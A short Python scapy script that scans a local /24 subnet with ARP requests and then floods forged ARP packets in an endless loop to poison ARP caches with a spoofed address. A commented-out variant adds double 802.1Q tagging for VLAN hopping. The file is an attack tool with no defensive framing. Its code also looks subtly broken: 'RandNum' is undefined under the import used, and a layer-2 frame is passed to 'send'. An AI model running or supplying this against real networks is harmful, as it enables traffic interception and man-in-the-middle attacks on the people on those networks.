import scapy.all as scapy
import sys

ans, unans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=sys.argv[1]+"/24"), timeout=2)

rep = ans.summary(lambda s,r: r.sprintf("%Ether.src% %ARP.psrc%"))

# Classic ARP cache poisoning:

scapy.send(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op="who-has", psrc=sys.argv[2], pdst=sys.argv[1]),inter=RandNum(10,40), loop=1 )

# ARP cache poisoning with double 802.1q encapsulation:

#send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
#      /ARP(op="who-has", psrc=gateway, pdst=client),
#      inter=RandNum(10,40), loop=1 )